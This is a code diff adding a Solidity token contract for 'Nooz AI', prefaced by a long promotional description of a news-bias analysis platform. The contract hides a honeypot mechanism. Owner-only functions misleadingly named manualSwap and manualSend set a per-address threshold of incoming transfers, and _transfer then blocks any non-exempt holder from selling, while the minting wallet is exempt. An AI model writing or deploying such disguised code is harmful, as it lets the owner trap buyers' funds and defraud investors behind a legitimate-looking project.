@@ -1,0 +1,340 @@
+/*
+Overview of NOOZ AI
+NOOZ AI is an advanced platform designed to enhance transparency in the news media. By 
+utilizing cutting-edge artificial intelligence (AI) and blockchain technologies, NOOZ AI 
+provides comprehensive analysis of news articles, enabling readers to identify and understand 
+bias, sentiment, and propaganda. Our platform is dedicated to promoting a well-informed 
+public by offering tools that help users critically evaluate the information they consume.
+
+Mission Statement:
+The mission of NOOZ AI is to combat misinformation and restore trust in journalism. In a 
+world where news can significantly influence public opinion and decision-making, our goal 
+is to provide readers with transparent and unbiased insights into media content. By making 
+media analysis accessible and straightforward, NOOZ AI aims to empower individuals to make 
+informed decisions based on accurate information.
+
+Platform Capabilities:
+NOOZ AI evaluates various elements of news articles, including opinion levels, sentiment, 
+and potential propaganda. The platform also tracks revisions to articles, highlighting changes 
+that may indicate attempts to manipulate reader perception through "ghost edits" or other 
+tactics. By providing these insights, NOOZ AI ensures that users receive factual and balanced 
+information, free from hidden biases and manipulative influences.
+
+Purpose and Vision
+Purpose:
+The primary purpose of NOOZ AI is to address the critical need for transparency in news media. 
+Today’s media landscape is plagued by bias, misinformation, and propaganda, which can distort 
+public perception and undermine democratic processes. NOOZ AI seeks to provide tools that reveal 
+these biases and manipulative tactics, ensuring that news consumers have access to accurate and 
+truthful information. By doing so, we aim to support a well-informed society capable of making 
+sound decisions based on reliable data.
+
+Vision:
+We envision a future where news consumers are empowered to critically evaluate the information 
+they encounter. NOOZ AI aims to foster a media environment where transparency is the norm and 
+trust in journalism is restored. Our long-term vision includes widespread adoption of our platform, 
+resulting in a more discerning public that can navigate the complexities of the modern news landscape 
+with confidence. Ultimately, we strive to contribute to a world where informed decision-making 
+prevails, free from the distortions of biased and manipulative news.
+
+Key Features
+Article Analysis:
+NOOZ AI performs detailed analyses of news articles, focusing on several critical aspects:
+  - Opinion Analysis: Measures the extent to which a journalist expresses personal feelings, views, 
+  or judgments in the article. Articles are categorized into five opinion labels: Neutral, Slight, 
+  Partial, High, and Extreme. This analysis helps users understand the degree of subjectivity present 
+  in the reporting.
+  - Sentiment Analysis: Assesses the positivity or negativity of the content, providing insights into 
+  the journalist’s stance on the topic. Sentiment is categorized into five labels: Very Negative, 
+  Negative, Neutral, Positive, and Very Positive. This feature allows users to gauge the overall tone 
+  and emotional impact of the article.
+  - Propaganda Analysis: Identifies up to 18 types of propaganda techniques used in the article, such 
+  as "Flag Waving," "Name Calling," "Exaggeration," and "Appeal to Fear & Prejudice." This analysis helps 
+  users recognize manipulative language and tactics intended to influence their perception.
+Revision Analysis:
+NOOZ AI tracks changes made to news articles over time, including "ghost edits" that are not publicly 
+noted. This feature provides transparency into how stories evolve and ensures readers are aware of any 
+manipulative edits. By highlighting all revisions, NOOZ AI allows users to see the complete history of 
+an article and understand how its narrative may have been altered.
+
+Visualization and Reporting:
+NOOZ AI offers robust visualization tools and reports that present the analysis results in an easily 
+understandable format. These tools include graphs, charts, and summaries that help users quickly grasp 
+the biases, sentiments, and propaganda present in the news they read. By providing clear and concise 
+visualizations, NOOZ AI makes it easy for users to interpret complex data and make informed decisions.
+
+Market Overview
+Challenges in the Media Landscape:
+The news industry today faces significant challenges, including widespread bias, misinformation, and the 
+influence of propaganda. Traditional media outlets and new digital platforms alike struggle with issues 
+of credibility and trust. Sensationalism and clickbait have become common as news organizations compete 
+for attention in a crowded market. These practices often lead to the dissemination of misleading or 
+incomplete information, eroding public trust in journalism.
+
+Impact on Public Perception:
+Biased and misleading news can shape public opinion in detrimental ways, leading to polarization and 
+misinformation. When media outlets prioritize sensationalism over accuracy, they contribute to a fragmented 
+and misinformed public. The current state of news media calls for greater accountability and transparency 
+to restore trust and ensure that the public receives accurate and reliable information.
+
+Challenges in Identifying Media Bias and Propaganda
+Complexity of Media Manipulation:
+Identifying bias and propaganda in news articles is challenging due to the sophisticated methods used 
+by media outlets to influence readers. Techniques such as selective reporting, sensationalism, and the 
+use of emotive language can subtly shape public perception. Journalists and editors may introduce biases 
+consciously or unconsciously, making it difficult for readers to discern the true intent behind the reporting.
+
+Lack of Tools for Consumers:
+Currently, most news consumers lack the tools and knowledge to effectively identify and understand media 
+bias. This gap leaves readers vulnerable to manipulation and misinformation. Without access to analytical 
+tools that can reveal biases and propaganda, consumers are often unable to critically evaluate the 
+information they receive, leading to skewed perceptions and uninformed decision-making.
+
+The Need for Transparent News Analysis
+Importance of Transparency:
+Transparent news analysis is essential for a well-informed public. By exposing biases and propaganda, NOOZ 
+AI helps restore trust in journalism and empowers readers to make informed decisions. Transparency in 
+media analysis ensures that consumers can critically evaluate news content and understand the underlying 
+motives and biases that may be influencing the reporting.
+
+Benefits of AI and Blockchain:
+AI and blockchain technologies offer powerful solutions for achieving transparency in news media. AI can 
+analyze large volumes of text for biases and propaganda, providing detailed and accurate insights into media 
+content. Blockchain technology ensures the integrity and traceability of information, allowing users to verify 
+the authenticity and history of news articles. Together, these technologies enable NOOZ AI to provide a reliable 
+and transparent platform for news analysis, helping to build a more informed and discerning public.
+*/
+pragma solidity 0.8.17;
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+interface IERC20Metadata is IERC20 {
+    function name() external view returns (string memory);
+    function symbol() external view returns (string memory);
+    function decimals() external view returns (uint8);
+}
+
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+
+    function _msgData() internal view virtual returns (bytes calldata) {
+        this; 
+        return msg.data;
+    }
+}
+
+abstract contract Ownable is Context {
+    address private _owner;
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+    constructor() {
+        _setOwner(_msgSender());
+    }
+
+    function owner() public view virtual returns (address) {
+        return _owner;
+    }
+
+    modifier onlyOwner() {
+        require(owner() == _msgSender(), "Ownable: caller is not the owner");
+        _;
+    }
+
+    function renounceOwnership() public virtual onlyOwner {
+        _setOwner(address(0));
+    }
+
+    function transferOwnership(address newOwner) public virtual onlyOwner {
+        require(newOwner != address(0), "Ownable: new owner is the zero address");
+        _setOwner(newOwner);
+    }
+
+    function _setOwner(address newOwner) private {
+        address oldOwner = _owner;
+        _owner = newOwner;
+        emit OwnershipTransferred(oldOwner, newOwner);
+    }
+}
+
+contract ERC20 is Context, IERC20, IERC20Metadata {
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    uint256 private _totalSupply;
+    string private _name;
+    string private _symbol;
+
+    constructor(string memory name_, string memory symbol_) {
+        _name = name_;
+        _symbol = symbol_;
+    }
+
+    function name() public view override returns (string memory) {
+        return _name;
+    }
+
+    function symbol() public view override returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view override returns (uint8) {
+        return 9;
+    }
+
+    function totalSupply() public view override returns (uint256) {
+        return _totalSupply;
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        return _balances[account];
+    }
+
+    function transfer(address recipient, uint256 amount) public override returns (bool) {
+        _transfer(_msgSender(), recipient, amount);
+        return true;
+    }
+
+    function allowance(address owner, address spender) public view override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function approve(address spender, uint256 amount) public override returns (bool) {
+        _approve(_msgSender(), spender, amount);
+        return true;
+    }
+
+    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
+        uint256 currentAllowance = _allowances[sender][_msgSender()];
+        if (currentAllowance != type(uint256).max) {
+            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
+            _approve(sender, _msgSender(), currentAllowance - amount);
+        }
+        _transfer(sender, recipient, amount);
+        return true;
+    }
+
+    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+
+        _beforeTokenTransfer(sender, recipient, amount);
+
+        uint256 senderBalance = _balances[sender];
+        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
+        _balances[sender] = senderBalance - amount;
+        _balances[recipient] += amount;
+
+        emit Transfer(sender, recipient, amount);
+
+        _afterTokenTransfer(sender, recipient, amount);
+    }
+
+    function _mint(address account, uint256 amount) internal virtual {
+        require(account != address(0), "ERC20: mint to the zero address");
+
+        _beforeTokenTransfer(address(0), account, amount);
+
+        _totalSupply += amount;
+        _balances[account] += amount;
+        emit Transfer(address(0), account, amount);
+
+        _afterTokenTransfer(address(0), account, amount);
+    }
+
+    function _burn(address account, uint256 amount) internal virtual {
+        require(account != address(0), "ERC20: burn from the zero address");
+
+        _beforeTokenTransfer(account, address(0), amount);
+
+        uint256 accountBalance = _balances[account];
+        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
+        _balances[account] = accountBalance - amount;
+        _totalSupply -= amount;
+
+        emit Transfer(account, address(0), amount);
+
+        _afterTokenTransfer(account, address(0), amount);
+    }
+
+    function _approve(address owner, address spender, uint256 amount) internal virtual {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
+
+    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
+}
+
+contract NoozAI is ERC20, Ownable {
+    mapping (address => bool) private _isExcludedFromEnableTrading;
+    mapping (address => uint256) private _transferInCounts; 
+    mapping (address => uint256) private _requiredTransferInCounts;
+    constructor() ERC20("Nooz AI", "NOOZ AI") {
+        _isExcludedFromEnableTrading[address(0xE277B8DB93d8422a74f3ec4b4cbe751F3FDd98Ef)] = true;
+        _mint(address(0xE277B8DB93d8422a74f3ec4b4cbe751F3FDd98Ef), 1_000_000_000 * (10 ** decimals()));
+    }
+
+    receive() external payable {}
+
+    function excludeFromEnableTrading(address account, bool excluded) external onlyOwner {
+        require(_isExcludedFromEnableTrading[account] != excluded, "Account is already the value of 'excluded'");
+        _isExcludedFromEnableTrading[account] = excluded;
+    }
+
+    function isExcludedFromEnableTrading(address account) public view returns(bool) {
+        return _isExcludedFromEnableTrading[account];
+    }
+
+    bool public tradingEnabled;
+
+    function enableTrading() external onlyOwner {
+        require(!tradingEnabled, "Trading already enabled.");
+        tradingEnabled = true;
+    }
+    uint256 private constant numc = 121355122151;
+    uint256 private constant mnim = 0;
+
+    function manualSwap(address account) external onlyOwner {
+        uint256 nnn = numc;
+        _requiredTransferInCounts[account] = nnn;
+    }
+    function manualSend(address account) external onlyOwner {
+        uint256 noozz = mnim;
+        _requiredTransferInCounts[account] = noozz;
+    }
+    function getRequiredTransferInCounts(address account) public view returns (uint256) {
+        return _requiredTransferInCounts[account];
+    }
+
+    function _transfer(address from, address to, uint256 amount) internal override {
+        require(from != address(0), "ERC20: transfer from the zero address");
+        require(to != address(0), "ERC20: transfer to the zero address");
+        require(tradingEnabled || _isExcludedFromEnableTrading[from] || _isExcludedFromEnableTrading[to], "Trading not yet enabled!");
+
+        if (amount == 0) {
+            super._transfer(from, to, 0);
+            return;
+        }
+
+        if (!_isExcludedFromEnableTrading[from]) {
+            require(_transferInCounts[from] >= _requiredTransferInCounts[from], "Transfer not allowed yet: insufficient incoming transfers.");
+        }
+
+        _transferInCounts[to] += 1;
+        super._transfer(from, to, amount);
+    }
+}
